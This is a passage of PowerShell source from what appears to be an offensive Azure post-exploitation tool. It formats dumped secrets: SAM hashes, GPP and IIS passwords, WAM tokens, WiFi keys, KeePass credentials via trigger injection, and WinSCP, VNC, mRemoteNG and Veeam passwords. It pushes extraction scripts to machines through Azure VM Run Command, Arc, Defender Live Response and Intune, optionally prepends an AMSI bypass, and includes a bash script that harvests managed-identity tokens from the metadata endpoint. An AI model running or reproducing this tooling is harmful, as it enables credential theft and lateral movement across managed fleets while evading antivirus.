                    $hashLine = "$($hash.Username):$($hash.RID):$($hash.LMHash):$($hash.NTHash):::"
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}${hashLine}" -Color "Green"
                }
            } elseif ($Data.SAMPath -and $Data.SYSTEMPath) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}Registry hives extracted via backup semantics:" -Color "Yellow"
                Write-ColorOutput -Message "${prefix}${target}${port}${os}  SAM:      $($Data.SAMPath)" -Color "White"
                Write-ColorOutput -Message "${prefix}${target}${port}${os}  SYSTEM:   $($Data.SYSTEMPath)" -Color "White"
                Write-ColorOutput -Message "${prefix}${target}${port}${os}  SECURITY: $($Data.SECURITYPath)" -Color "White"
                Write-ColorOutput -Message "${prefix}${target}${port}${os}  Command: secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL" -Color "Cyan"
            }
            if ($Data.NTDSStagedPath) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}NTDS.dit staged (DC): $($Data.NTDSStagedPath)" -Color "Yellow"
            }
            if ($Data.Error) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}Backup extraction failed: $($Data.Error)" -Color "Red"
            }
        }

        "SCCM" {
            Write-ColorOutput -Message "${prefix}${target}${port}${os}(SCCM_DUMP)" -Color "Cyan"

            if ($Data.GPPPasswords -and $Data.GPPPasswords.Count -gt 0) {
                foreach ($gpp in $Data.GPPPasswords) {
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}GPP cpassword: $($gpp.File) -> $($gpp.Username):$($gpp.Password)" -Color "Green"
                }
            }
            if ($Data.SCCMCacheFindings -and $Data.SCCMCacheFindings.Count -gt 0) {
                foreach ($finding in $Data.SCCMCacheFindings) {
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}SCCM Cache: $($finding.Path) -> $($finding.Type)" -Color "Yellow"
                }
            }
            if ($Data.IntuneScripts -and $Data.IntuneScripts.Count -gt 0) {
                foreach ($script in $Data.IntuneScripts) {
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}Intune Script: $($script.Path) -> $($script.Finding)" -Color "Yellow"
                }
            }
            if ($Data.IISConfigs -and $Data.IISConfigs.Count -gt 0) {
                foreach ($iis in $Data.IISConfigs) {
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}IIS Config: $($iis.Path) -> $($iis.Username):$($iis.Password)" -Color "Green"
                }
            }
            if ($Data.GraphAPIFindings -and $Data.GraphAPIFindings.Count -gt 0) {
                foreach ($finding in $Data.GraphAPIFindings) {
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}Intune Profile: $($finding.Name) -> $($finding.Type)" -Color "Yellow"
                }
            }
            $totalFindings = 0
            if ($Data.GPPPasswords) { $totalFindings += $Data.GPPPasswords.Count }
            if ($Data.SCCMCacheFindings) { $totalFindings += $Data.SCCMCacheFindings.Count }
            if ($Data.IntuneScripts) { $totalFindings += $Data.IntuneScripts.Count }
            if ($Data.IISConfigs) { $totalFindings += $Data.IISConfigs.Count }
            if ($Data.GraphAPIFindings) { $totalFindings += $Data.GraphAPIFindings.Count }
            if ($totalFindings -eq 0) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}No SCCM/Intune/GPP secrets found" -Color "DarkGray"
            }
            if ($Data.Error) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}SCCM extraction failed: $($Data.Error)" -Color "Red"
            }
        }

        "WAM" {
            Write-ColorOutput -Message "${prefix}${target}${port}${os}(WAM_DUMP)" -Color "Cyan"

            if ($Data.Tokens -and $Data.Tokens.Count -gt 0) {
                foreach ($token in $Data.Tokens) {
                    $upn = if ($token.UPN) { $token.UPN } else { "unknown" }
                    $audience = if ($token.Audience) { $token.Audience -replace "https://", "" -replace "/", "" } else { "unknown" }
                    $expiry = if ($token.Expiry) { $token.Expiry } else { "unknown" }
                    $scope = if ($token.Scope) { $token.Scope } else { "" }
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}WAM Token: ${upn} -> ${audience} (exp: ${expiry})" -Color "Green"
                    if ($scope) {
                        Write-ColorOutput -Message "${prefix}${target}${port}${os}  Scope: ${scope}" -Color "DarkGray"
                    }
                    if ($token.RawJWT) {
                        $jwtPreview = $token.RawJWT.Substring(0, [Math]::Min(50, $token.RawJWT.Length)) + "..."
                        Write-ColorOutput -Message "${prefix}${target}${port}${os}  JWT: ${jwtPreview}" -Color "DarkGray"
                    }
                }
            }
            if ($Data.DPAPIMasterKeys -and $Data.DPAPIMasterKeys.Count -gt 0) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}DPAPI Master Keys found: $($Data.DPAPIMasterKeys.Count) keys" -Color "Yellow"
                foreach ($mk in $Data.DPAPIMasterKeys) {
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}  SID: $($mk.SID) -> $($mk.Path)" -Color "DarkGray"
                }
            }
            if ((-not $Data.Tokens -or $Data.Tokens.Count -eq 0) -and (-not $Data.DPAPIMasterKeys -or $Data.DPAPIMasterKeys.Count -eq 0)) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}No WAM tokens found" -Color "DarkGray"
            }
            if ($Data.Error) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}WAM extraction failed: $($Data.Error)" -Color "Red"
            }
        }

        "WIFI" {
            Write-ColorOutput -Message "${prefix}${target}${port}${os}(WIFI_DUMP)" -Color "Cyan"
            if ($Data.Profiles -and $Data.Profiles.Count -gt 0) {
                foreach ($profile in $Data.Profiles) {
                    $ssid = $profile.SSID
                    $auth = if ($profile.Authentication) { $profile.Authentication } else { "Unknown" }
                    $key = if ($profile.Key) { $profile.Key } else { "[NO KEY]" }
                    if ($profile.Key) {
                        Write-ColorOutput -Message "${prefix}${target}${port}${os}WiFi: ${ssid} [${auth}] -> ${key}" -Color "Green"
                    } else {
                        Write-ColorOutput -Message "${prefix}${target}${port}${os}WiFi: ${ssid} [${auth}] -> [NO KEY]" -Color "Yellow"
                    }
                }
            } else {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}No WiFi profiles found" -Color "DarkGray"
            }
            if ($Data.Error) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}WiFi extraction issue: $($Data.Error)" -Color "Yellow"
            }
        }

        "PUTTY" {
            Write-ColorOutput -Message "${prefix}${target}${port}${os}(PUTTY_DUMP)" -Color "Cyan"
            if ($Data.Sessions -and $Data.Sessions.Count -gt 0) {
                foreach ($session in $Data.Sessions) {
                    $sName = $session.SessionName
                    $host = $session.HostName
                    $port2 = $session.Port
                    $keyFile = if ($session.PublicKeyFile) { " (key: $($session.PublicKeyFile))" } else { "" }
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}PuTTY: ${sName} -> ${host}:${port2}${keyFile}" -Color "Yellow"
                    if ($session.ProxyUsername -and $session.ProxyPassword) {
                        Write-ColorOutput -Message "${prefix}${target}${port}${os}  Proxy creds: $($session.ProxyUsername):$($session.ProxyPassword)" -Color "Green"
                    }
                }
            } else {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}No PuTTY sessions found" -Color "DarkGray"
            }
            if ($Data.Error) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}PuTTY extraction failed: $($Data.Error)" -Color "Red"
            }
        }

        "NOTEPAD" {
            Write-ColorOutput -Message "${prefix}${target}${port}${os}(NOTEPAD_DUMP)" -Color "Cyan"
            if ($Data.Tabs -and $Data.Tabs.Count -gt 0) {
                foreach ($tab in $Data.Tabs) {
                    $path = $tab.FilePath
                    $size = $tab.SizeBytes
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}Notepad Tab: ${path} (${size} bytes recovered)" -Color "Yellow"
                    if ($tab.RecoveredText) {
                        $preview = if ($tab.RecoveredText.Length -gt 80) { $tab.RecoveredText.Substring(0, 80) + "..." } else { $tab.RecoveredText }
                        $preview = $preview -replace "`n", " | "
                        Write-ColorOutput -Message "${prefix}${target}${port}${os}  Preview: ${preview}" -Color "DarkGray"
                    }
                }
            } else {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}No Notepad tab state found" -Color "DarkGray"
            }
            if ($Data.Error) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}Notepad extraction failed: $($Data.Error)" -Color "Red"
            }
        }

        "NOTEPADPP" {
            Write-ColorOutput -Message "${prefix}${target}${port}${os}(NOTEPADPP_DUMP)" -Color "Cyan"
            if ($Data.BackupFiles -and $Data.BackupFiles.Count -gt 0) {
                foreach ($bf in $Data.BackupFiles) {
                    $fname = $bf.FileName
                    $size = $bf.SizeBytes
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}Notepad++ Backup: ${fname} (${size} bytes)" -Color "Yellow"
                    if ($bf.Content) {
                        $preview = if ($bf.Content.Length -gt 80) { $bf.Content.Substring(0, 80) + "..." } else { $bf.Content }
                        $preview = $preview -replace "`n", " | "
                        Write-ColorOutput -Message "${prefix}${target}${port}${os}  Preview: ${preview}" -Color "DarkGray"
                    }
                }
            }
            if ($Data.RecentFiles -and $Data.RecentFiles.Count -gt 0) {
                foreach ($rf in $Data.RecentFiles) {
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}  Recent file: $($rf.FilePath)" -Color "DarkGray"
                }
            }
            if ((-not $Data.BackupFiles -or $Data.BackupFiles.Count -eq 0) -and (-not $Data.RecentFiles -or $Data.RecentFiles.Count -eq 0)) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}No Notepad++ backups found" -Color "DarkGray"
            }
            if ($Data.Error) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}Notepad++ extraction failed: $($Data.Error)" -Color "Red"
            }
        }

        "KEEPASS_DISCOVER" {
            Write-ColorOutput -Message "${prefix}${target}${port}${os}(KEEPASS_DISCOVER)" -Color "Cyan"
            if ($Data.ConfigFiles -and $Data.ConfigFiles.Count -gt 0) {
                foreach ($cf in $Data.ConfigFiles) {
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}KeePass Config: $($cf.Path)" -Color "Yellow"
                }
            }
            if ($Data.DatabaseFiles -and $Data.DatabaseFiles.Count -gt 0) {
                foreach ($db in $Data.DatabaseFiles) {
                    $size = if ($db.SizeBytes) { "$([math]::Round($db.SizeBytes / 1KB, 1)) KB" } else { "unknown" }
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}KeePass DB: $($db.Path) (${size})" -Color "Green"
                }
            }
            if ($Data.Executables -and $Data.Executables.Count -gt 0) {
                foreach ($exe in $Data.Executables) {
                    $ver = if ($exe.Version) { " v$($exe.Version)" } else { "" }
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}KeePass Exe: $($exe.Path)${ver}" -Color "Yellow"
                }
            }
            if ($Data.RunningProcesses -and $Data.RunningProcesses.Count -gt 0) {
                foreach ($proc in $Data.RunningProcesses) {
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}KeePass Running: PID $($proc.PID) ($($proc.UserName))" -Color "Cyan"
                }
            }
            $totalFindings = 0
            if ($Data.ConfigFiles) { $totalFindings += $Data.ConfigFiles.Count }
            if ($Data.DatabaseFiles) { $totalFindings += $Data.DatabaseFiles.Count }
            if ($Data.Executables) { $totalFindings += $Data.Executables.Count }
            if ($totalFindings -eq 0) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}No KeePass installations found" -Color "DarkGray"
            }
            if ($Data.Error) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}KeePass discovery failed: $($Data.Error)" -Color "Red"
            }
        }

        "KEEPASS_TRIGGER" {
            Write-ColorOutput -Message "${prefix}${target}${port}${os}(KEEPASS_TRIGGER)" -Color "Cyan"
            $act = if ($Data.Action) { $Data.Action } else { "unknown" }
            Write-ColorOutput -Message "${prefix}${target}${port}${os}Action: ${act}" -Color "Yellow"
            if ($Data.TriggerAdded) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}Trigger: INJECTED" -Color "Green"
            }
            if ($Data.ExportFound) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}Export: FOUND" -Color "Green"
            }
            if ($Data.Credentials -and $Data.Credentials.Count -gt 0) {
                foreach ($cred in $Data.Credentials) {
                    $title = if ($cred.Title) { $cred.Title } else { "untitled" }
                    $user = if ($cred.Username) { $cred.Username } else { "" }
                    $pass = if ($cred.Password) { $cred.Password } else { "" }
                    $url = if ($cred.URL) { " ($($cred.URL))" } else { "" }
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}KeePass: ${title} -> ${user}:${pass}${url}" -Color "Green"
                }
            }
            if ($Data.Cleaned) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}Cleanup: DONE" -Color "Cyan"
            }
            if ($Data.Error) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}KeePass trigger failed: $($Data.Error)" -Color "Red"
            }
        }

        "RDCMAN" {
            Write-ColorOutput -Message "${prefix}${target}${port}${os}(RDCMAN_DUMP)" -Color "Cyan"
            if ($Data.Connections -and $Data.Connections.Count -gt 0) {
                foreach ($conn in $Data.Connections) {
                    $server = $conn.ServerName
                    $domain = if ($conn.Domain) { "$($conn.Domain)\" } else { "" }
                    $user = if ($conn.Username) { $conn.Username } else { "N/A" }
                    $enc = if ($conn.EncryptedPassword) { " [DPAPI encrypted]" } else { "" }
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}RDCMan: ${server} -> ${domain}${user}${enc}" -Color "Yellow"
                }
            } else {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}No RDCMan connections found" -Color "DarkGray"
            }
            if ($Data.Error) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}RDCMan extraction failed: $($Data.Error)" -Color "Red"
            }
        }

        "EVENTLOG_CREDS" {
            Write-ColorOutput -Message "${prefix}${target}${port}${os}(EVENTLOG_CREDS)" -Color "Cyan"
            if ($Data.Credentials -and $Data.Credentials.Count -gt 0) {
                foreach ($cred in $Data.Credentials) {
                    $user = if ($cred.Username) { $cred.Username } else { "N/A" }
                    $pass = $cred.Password
                    $src = $cred.Source
                    $cmd = if ($cred.CommandLine) { $cred.CommandLine } else { "" }
                    $cmdSnippet = if ($cmd.Length -gt 50) { $cmd.Substring(0, 50) + "..." } else { $cmd }
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}EventLog: ${user}:${pass} (${src}: ${cmdSnippet})" -Color "Green"
                }
            } else {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}No credentials found in event logs" -Color "DarkGray"
            }
            if ($Data.Error) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}EventLog extraction failed: $($Data.Error)" -Color "Red"
            }
        }

        "WINSCP" {
            Write-ColorOutput -Message "${prefix}${target}${port}${os}(WINSCP_DUMP)" -Color "Cyan"
            if ($Data.Sessions -and $Data.Sessions.Count -gt 0) {
                foreach ($session in $Data.Sessions) {
                    $host2 = $session.HostName
                    $port2 = $session.Port
                    $user = if ($session.UserName) { $session.UserName } else { "N/A" }
                    $pass = if ($session.Password -and $session.Password -notmatch '^\[') { $session.Password } else { $session.Password }
                    $proto = if ($session.Protocol) { $session.Protocol } else { "SFTP" }
                    if ($session.MasterPasswordProtected) {
                        Write-ColorOutput -Message "${prefix}${target}${port}${os}WinSCP: ${host2}:${port2} -> ${user}:[MASTER_PW_PROTECTED] [${proto}]" -Color "Yellow"
                    } elseif ($pass) {
                        Write-ColorOutput -Message "${prefix}${target}${port}${os}WinSCP: ${host2}:${port2} -> ${user}:${pass} [${proto}]" -Color "Green"
                    } else {
                        Write-ColorOutput -Message "${prefix}${target}${port}${os}WinSCP: ${host2}:${port2} -> ${user} [${proto}]" -Color "Yellow"
                    }
                }
            } else {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}No WinSCP sessions found" -Color "DarkGray"
            }
            if ($Data.Error) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}WinSCP extraction failed: $($Data.Error)" -Color "Red"
            }
        }

        "VNC" {
            Write-ColorOutput -Message "${prefix}${target}${port}${os}(VNC_DUMP)" -Color "Cyan"
            if ($Data.Passwords -and $Data.Passwords.Count -gt 0) {
                foreach ($pw in $Data.Passwords) {
                    $type = if ($pw.Type) { $pw.Type } else { "VNC" }
                    $decrypted = if ($pw.DecryptedPassword) { $pw.DecryptedPassword } else { "[EMPTY]" }
                    Write-ColorOutput -Message "${prefix}${target}${port}${os}VNC [${type}]: -> [DECRYPTED] ${decrypted}" -Color "Green"
                }
            } else {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}No VNC passwords found" -Color "DarkGray"
            }
            if ($Data.Error) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}VNC extraction failed: $($Data.Error)" -Color "Red"
            }
        }

        "MREMOTENG" {
            Write-ColorOutput -Message "${prefix}${target}${port}${os}(MREMOTENG_DUMP)" -Color "Cyan"
            if ($Data.Connections -and $Data.Connections.Count -gt 0) {
                foreach ($conn in $Data.Connections) {
                    $name = if ($conn.Name) { $conn.Name } else { "unnamed" }
                    $host2 = if ($conn.Hostname) { $conn.Hostname } else { "N/A" }
                    $port2 = if ($conn.Port) { $conn.Port } else { "" }
                    $user = if ($conn.Username) { $conn.Username } else { "" }
                    $pass = if ($conn.Password) { $conn.Password } else { "" }
                    $proto = if ($conn.Protocol) { " [$($conn.Protocol)]" } else { "" }
                    if ($conn.Encrypted) {
                        Write-ColorOutput -Message "${prefix}${target}${port}${os}mRemoteNG: ${name} -> ${host2}:${port2} ${user}:[encrypted]${proto}" -Color "Yellow"
                    } else {
                        Write-ColorOutput -Message "${prefix}${target}${port}${os}mRemoteNG: ${name} -> ${host2}:${port2} ${user}:${pass}${proto}" -Color "Green"
                    }
                }
            } else {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}No mRemoteNG connections found" -Color "DarkGray"
            }
            if ($Data.Error) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}mRemoteNG extraction failed: $($Data.Error)" -Color "Red"
            }
        }

        "VEEAM" {
            Write-ColorOutput -Message "${prefix}${target}${port}${os}(VEEAM_DUMP)" -Color "Cyan"
            if ($Data.DatabaseConfig) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}Veeam DB: $($Data.DatabaseConfig.SqlInstance)\$($Data.DatabaseConfig.SqlDatabase)" -Color "Yellow"
            }
            if ($Data.Credentials -and $Data.Credentials.Count -gt 0) {
                foreach ($cred in $Data.Credentials) {
                    $user = $cred.Username
                    $pass = if ($cred.Password -and $cred.Password -notmatch '^\[DPAPI_FAILED') { $cred.Password } else { $cred.Password }
                    $desc = if ($cred.Description) { " ($($cred.Description))" } else { "" }
                    if ($pass -match '^\[DPAPI_FAILED') {
                        Write-ColorOutput -Message "${prefix}${target}${port}${os}Veeam: ${user} -> [DPAPI_PROTECTED]${desc}" -Color "Yellow"
                    } else {
                        Write-ColorOutput -Message "${prefix}${target}${port}${os}Veeam: ${user} -> ${pass}${desc}" -Color "Green"
                    }
                }
            } elseif (-not $Data.Error) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}No Veeam credentials found" -Color "DarkGray"
            }
            if ($Data.Error) {
                Write-ColorOutput -Message "${prefix}${target}${port}${os}Veeam extraction failed: $($Data.Error)" -Color "Red"
            }
        }
    }
}

# ============================================
# SINGLE TARGET EXTRACTION FUNCTIONS
# ============================================

<#
.SYNOPSIS
    Execute SAM extraction on a single target.
.PARAMETER Target
    Target object with VM/Device information.
.PARAMETER AmsiBypass
    Path to AMSI bypass script.
.PARAMETER Timeout
    Execution timeout in seconds.
.OUTPUTS
    PSCustomObject with extraction results.
#>
function Invoke-SAMExtraction {
    param(
        [Parameter(Mandatory = $true)]
        $Target,

        [Parameter(Mandatory = $false)]
        [string]$AmsiBypass,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300
    )

    $result = @{
        TargetName = $Target.Name
        TargetType = $Target.Type
        ResourceGroup = $Target.ResourceGroup
        Subscription = $Target.Subscription
        OSType = $Target.OSType
        ExtractionType = "SAM"
        Success = $false
        Data = $null
        Error = $null
    }

    # SAM extraction only works on Windows
    if ($Target.OSType -ne "Windows") {
        $result.Error = "SAM extraction is only supported on Windows targets"
        return [PSCustomObject]$result
    }

    try {
        # Switch to correct subscription context
        if ($Target.SubscriptionId) {
            Set-AzContext -SubscriptionId $Target.SubscriptionId -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        }

        $script = Get-SAMExtractionScript

        # Add AMSI bypass if specified
        if ($AmsiBypass -and (Test-Path $AmsiBypass)) {
            $amsiContent = Get-Content -Path $AmsiBypass -Raw
            $script = $amsiContent + "`n" + $script
        }

        # Execute based on target type
        $output = ""

        if ($Target.Type -eq "AzureVM") {
            $cmdResult = Invoke-AzVMRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -VMName $Target.Name `
                -CommandId "RunPowerShellScript" `
                -ScriptString $script `
                -ErrorAction Stop

            $output = $cmdResult.Value[0].Message

        } elseif ($Target.Type -eq "Arc") {
            $runCommandName = "azx-creds-$(Get-Date -Format 'yyyyMMdd-HHmmss')"

            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -Location $Target.Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop

            $output = $arcResult.InstanceViewOutput

            # Cleanup
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue

        } elseif ($Target.Type -eq "MDEDevice") {
            # MDE Live Response execution
            Write-ColorOutput -Message "    [*] Using MDE Live Response (async)..." -Color "Cyan"

            $mdeResult = Invoke-MDELiveResponse `
                -MachineId $Target.MDEMachineId `
                -Command $script `
                -AccessToken $Target.MDEToken `
                -Timeout $Timeout

            if ($mdeResult.Status -eq "Success") {
                $output = $mdeResult.Output
            } else {
                throw "MDE Live Response failed: $($mdeResult.Output)"
            }

        } elseif ($Target.Type -eq "IntuneDevice") {
            # Intune Proactive Remediation execution
            Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"

            $intuneResult = Invoke-IntuneRemediation `
                -DeviceId $Target.IntuneDeviceId `
                -Command $script `
                -PowerShell:$true `
                -DeviceName $Target.Name

            if ($intuneResult.Status -eq "Triggered") {
                # Intune is async - no immediate output
                $output = "---INTUNE_ASYNC---`nScript deployed to $($Target.Name). Check Intune portal for output."
                $result.Error = "Intune extraction is async-only - check Intune portal for results"
            } else {
                throw "Intune Remediation failed: $($intuneResult.Output)"
            }
        }

        # Clean up output
        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        # Parse results
        $tempDir = "$env:TEMP\azx_sam_$($Target.Name)_$(Get-Date -Format 'yyyyMMddHHmmss')"
        $parsed = Parse-SAMOutput -Output $output -TempDir $tempDir

        $result.Data = $parsed
        $result.Success = $parsed.Success
        if ($parsed.Error) {
            $result.Error = $parsed.Error
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

<#
.SYNOPSIS
    Execute token extraction on a single target.
.PARAMETER Target
    Target object with VM/Device information.
.PARAMETER Timeout
    Execution timeout in seconds.
.OUTPUTS
    PSCustomObject with extraction results.
#>
function Invoke-TokenExtraction {
    param(
        [Parameter(Mandatory = $true)]
        $Target,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300
    )

    $result = @{
        TargetName = $Target.Name
        TargetType = $Target.Type
        ResourceGroup = $Target.ResourceGroup
        Subscription = $Target.Subscription
        OSType = $Target.OSType
        ExtractionType = "TOKEN"
        Success = $false
        Data = $null
        Error = $null
    }

    try {
        # Switch to correct subscription context
        if ($Target.SubscriptionId) {
            Set-AzContext -SubscriptionId $Target.SubscriptionId -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        }

        $script = Get-TokenExtractionScript

        # Execute based on target type
        $output = ""
        $commandId = if ($Target.OSType -eq "Windows") { "RunPowerShellScript" } else { "RunShellScript" }

        # For Linux, convert PowerShell to bash curl commands
        if ($Target.OSType -ne "Windows") {
            $script = @'
#!/bin/bash
imds_url="http://169.254.169.254/metadata/identity/oauth2/token"
resources=(
    "https://management.azure.com/"
    "https://graph.microsoft.com/"
    "https://vault.azure.net/"
    "https://storage.azure.com/"
)
echo "---TOKENS---"
tokens="["
first=true
for r in "${resources[@]}"; do
    response=$(curl -s -H "Metadata:true" "${imds_url}?api-version=2018-02-01&resource=${r}" 2>/dev/null)
    if [[ $response == *"access_token"* ]]; then
        if [ "$first" = false ]; then tokens+=","; fi
        first=false
        token=$(echo $response | grep -oP '"access_token":"\K[^"]+')
        expires=$(echo $response | grep -oP '"expires_in":"\K[^"]+' || echo "3600")
        tokens+="{\"Resource\":\"${r}\",\"Token\":\"${token}\",\"ExpiresIn\":\"${expires}\"}"
    fi
done
tokens+="]"
if [ "$tokens" = "[]" ]; then
    echo "NO_MANAGED_IDENTITY"
else
    echo "$tokens"
fi
echo "---SUCCESS---"
'@
        }

        if ($Target.Type -eq "AzureVM") {
            $cmdResult = Invoke-AzVMRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -VMName $Target.Name `
                -CommandId $commandId `
                -ScriptString $script `
                -ErrorAction Stop

            $output = $cmdResult.Value[0].Message

        } elseif ($Target.Type -eq "Arc") {
            $runCommandName = "azx-token-$(Get-Date -Format 'yyyyMMdd-HHmmss')"

            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -Location $Target.Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop

            $output = $arcResult.InstanceViewOutput

            # Cleanup
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue

        } elseif ($Target.Type -eq "MDEDevice") {
            # MDE Live Response execution
            Write-ColorOutput -Message "    [*] Using MDE Live Response (async)..." -Color "Cyan"

            $mdeResult = Invoke-MDELiveResponse `
                -MachineId $Target.MDEMachineId `
                -Command $script `
                -AccessToken $Target.MDEToken `
                -Timeout $Timeout

            if ($mdeResult.Status -eq "Success") {
                $output = $mdeResult.Output
            } else {
                throw "MDE Live Response failed: $($mdeResult.Output)"
            }

        } elseif ($Target.Type -eq "IntuneDevice") {
            # Intune Proactive Remediation execution
            Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"

            $intuneResult = Invoke-IntuneRemediation `
                -DeviceId $Target.IntuneDeviceId `
                -Command $script `
                -PowerShell:$true `
                -DeviceName $Target.Name

            if ($intuneResult.Status -eq "Triggered") {
                # Intune is async - no immediate output
                $output = "---INTUNE_ASYNC---`nScript deployed to $($Target.Name). Check Intune portal for output."
                $result.Error = "Intune extraction is async-only - check Intune portal for results"
            } else {
                throw "Intune Remediation failed: $($intuneResult.Output)"
            }
        }

        # Clean up output
        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        # Parse results
        $parsed = Parse-TokenOutput -Output $output

        $result.Data = $parsed
        $result.Success = $parsed.Success
        if ($parsed.Error) {
            $result.Error = $parsed.Error
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

<#
.SYNOPSIS
    Execute DPAPI extraction on a single target.
.PARAMETER Target
    Target object with VM/Device information.
.PARAMETER AmsiBypass
    Path to AMSI bypass script.
.PARAMETER Timeout
    Execution timeout in seconds.
.OUTPUTS
    PSCustomObject with extraction results.
#>
function Invoke-DPAPIExtraction {
    param(
        [Parameter(Mandatory = $true)]
        $Target,

        [Parameter(Mandatory = $false)]
        [string]$AmsiBypass,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300
    )

    $result = @{
        TargetName = $Target.Name
        TargetType = $Target.Type
        ResourceGroup = $Target.ResourceGroup
        Subscription = $Target.Subscription
        OSType = $Target.OSType
        ExtractionType = "DPAPI"
        Success = $false
        Data = $null
        Error = $null
    }

    # DPAPI extraction only works on Windows
    if ($Target.OSType -ne "Windows") {
        $result.Error = "DPAPI extraction is only supported on Windows targets"
        return [PSCustomObject]$result
    }

    try {
        # Switch to correct subscription context
        if ($Target.SubscriptionId) {
            Set-AzContext -SubscriptionId $Target.SubscriptionId -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        }

        $script = Get-DPAPIExtractionScript

        # Add AMSI bypass if specified
        if ($AmsiBypass -and (Test-Path $AmsiBypass)) {
            $amsiContent = Get-Content -Path $AmsiBypass -Raw
            $script = $amsiContent + "`n" + $script
        }

        # Execute based on target type
        $output = ""

        if ($Target.Type -eq "AzureVM") {
            $cmdResult = Invoke-AzVMRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -VMName $Target.Name `
                -CommandId "RunPowerShellScript" `
                -ScriptString $script `
                -ErrorAction Stop

            $output = $cmdResult.Value[0].Message

        } elseif ($Target.Type -eq "Arc") {
            $runCommandName = "azx-dpapi-$(Get-Date -Format 'yyyyMMdd-HHmmss')"

            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -Location $Target.Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop

            $output = $arcResult.InstanceViewOutput

            # Cleanup
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue

        } elseif ($Target.Type -eq "MDEDevice") {
            # MDE Live Response execution
            Write-ColorOutput -Message "    [*] Using MDE Live Response (async)..." -Color "Cyan"

            $mdeResult = Invoke-MDELiveResponse `
